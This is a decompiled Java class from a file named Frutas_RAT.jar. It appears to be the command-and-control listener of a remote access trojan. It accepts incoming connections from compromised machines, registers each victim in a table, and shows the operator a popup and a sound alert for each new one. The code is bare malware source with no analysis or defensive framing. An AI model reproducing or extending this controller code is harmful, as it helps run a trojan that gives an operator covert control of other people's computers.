/*    */ package cliente;
/*    */ 
/*    */ import Extras.Sonid;
/*    */ import java.io.IOException;
/*    */ import java.io.PrintStream;
/*    */ import java.net.ServerSocket;
/*    */ import java.net.Socket;
/*    */ import java.util.HashMap;
/*    */ import javax.swing.JLabel;
/*    */ 
/*    */ public class Escucha extends Thread
/*    */ {
/*    */   public static FrutaManager frutamanager;
/* 13 */   public static HashMap<String, Usuario> USUARIOS = new HashMap();
/* 14 */   public static boolean CONECTADO = true;
/*    */   private ServerSocket escuchad;
/*    */   private Socket socket;
/*    */ 
/*    */   public static synchronized Usuario listGet(String id)
/*    */   {
/* 19 */     return (Usuario)USUARIOS.get(id);
/*    */   }
/*    */ 
/*    */   public Escucha(int puerto, int cola, FrutaManager fruta) throws IOException {
/* 23 */     this.escuchad = new ServerSocket(puerto, cola);
/* 24 */     frutamanager = fruta;
/* 25 */     System.out.println("Iniciando Servidor por primera vez en el puerto: " + puerto);
/* 26 */     CONECTADO = true;
/*    */   }
/*    */ 
/*    */   public void run()
/*    */   {
/*    */     do {
/*    */       try
/*    */       {
/* 35 */         this.socket = this.escuchad.accept();
/* 36 */         Usuario user = new Usuario(this.socket, frutamanager);
/* 37 */         if (user.isConectado())
/*    */         {
/* 39 */           user.agregarAtABLA();
/*    */ 
/* 41 */           USUARIOS.put(user.getIdentificador(), user);
/* 42 */           user.start();
/* 43 */           new Sonid().start();
/*    */ 
/* 45 */           popupBarra p = new popupBarra(frutamanager, false);
/* 46 */           p.ip.setText("ID: " + user.getIdentificador());
/* 47 */           p.setVisible(true);
/*    */         } else {
/* 49 */           user.CierraConexion();
/*    */         }
/*    */       } catch (IOException ex) {
/* 52 */         System.out.println("Cerre conexion");
/*    */       }
/*    */     }
/* 55 */     while (CONECTADO);
/*    */   }
/*    */ 
/*    */   public void stopPara()
/*    */   {
/* 61 */     CONECTADO = false;
/*    */     try
/*    */     {
/* 71 */       this.escuchad.close();
/*    */     }
/*    */     catch (IOException ex) {
/* 74 */       System.out.println("Error en: StopPara");
/*    */     }
/*    */   }
/*    */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.Escucha
 * JD-Core Version:    0.6.2
 */